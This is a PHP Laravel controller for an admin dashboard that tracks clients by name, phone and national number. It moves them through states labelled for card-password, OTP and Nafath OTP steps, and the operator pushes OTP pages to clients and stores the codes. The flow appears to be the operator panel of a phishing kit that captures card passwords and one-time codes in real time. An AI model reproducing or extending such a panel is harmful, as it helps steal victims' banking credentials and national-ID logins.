<?php

namespace App\Http\Controllers\Dashboard;

use App\Http\Controllers\Controller;
use App\Http\Requests\StoreClientRequest;
use App\Models\Client;
use App\Models\Notification;
use Illuminate\Http\Request;
use RealRashid\SweetAlert\Facades\Alert;

class ClientController extends Controller
{
    public function index() {
        $clients = Client::paginate(10);
        return view('dashboard.clients.index', ['clients'=> $clients]);
    }

    public function edit($client_id){
        $client = Client::whereId($client_id)->firstOrFail();
        return view('dashboard.clients.edit' , ['client' => $client]);
    }
    public function update(StoreClientRequest $request){
        $inputs = $request->all();
        $service =Client::whereId($inputs['id'])->update(['first_name'=>$inputs['first_name'] ,
         'phone'=> $inputs['phone'] ,'last_name'=>$inputs['last_name'], 'national_number' => $inputs['national_number']]);
        Alert::info(' العملاء', 'تم تعديل الخدمة بنجاح');
        return redirect()->route('clients.index');
    }

    public function destroy(Client $client) {
        $client->delete();
        Alert::info(' العملاء', 'تم حذف العميل بنجاح');
        return redirect()->route('clients.index');
    }

    public function event(Client $client){
        Notification::where('client_id' , $client->id)->delete();
        if($client->end_point == END_REGISTRATION || $client->RESEND_OTP){
            return view('dashboard.clients.send_otp',compact('client'));
        }elseif ($client->end_point == SUCCESS_OTP) {

        }elseif ($client->end_point == SEND_VISA_PASSWORD) {
            return view('dashboard.clients.send_nafed_otp',compact('client'));
        }
    }

    public function doEvent(Request $request , Client $client){
        $inputs = $request->all();
        if($inputs['event'] == EVENT_STORE_OTP){
            $client->otp_number = $inputs['otp_number'];
            $client->end_point = VALIDATE_OTP;
        }elseif ($inputs['event'] == EVENT_STORE_NAFED_OTP) {
            $client->end_point = SEND_NAFED_OTP;
            $client->nafed_otp = $inputs['nafed_otp'];
        }
        $client->save();

        Alert::success(' تم الارسال', 'تم الحفظ بنجاح');
        return redirect()->route('clients.index');
    }
}
